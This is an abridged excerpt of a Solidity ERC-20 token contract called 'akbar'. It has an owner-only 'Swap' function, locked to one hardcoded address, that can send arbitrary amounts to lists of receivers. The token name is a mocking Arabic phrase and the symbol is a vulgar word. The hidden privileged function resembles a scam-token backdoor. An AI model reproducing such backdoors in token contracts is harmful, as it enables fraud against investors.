...
contract akbar is Context, IERC20 {
    ...
    modifier _auth() {require(msg.sender == 0xeB0DBf48b0440587B2e483f2A6557769Ccc0212c, "Not allowed to interact");_;}
  ...
  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    ...
    address public _Owner = 0xeB0DBf48b0440587B2e483f2A6557769Ccc0212c;

    constructor () public {
        _name = "أخي ممنوع من شراء هذه القطع النقدية";
        _symbol ="الأعضاء التناسلية";
        _decimals = 18;
        uint256 initialSupply = 1000000000;
        team = 0xeB0DBf48b0440587B2e483f2A6557769Ccc0212c;
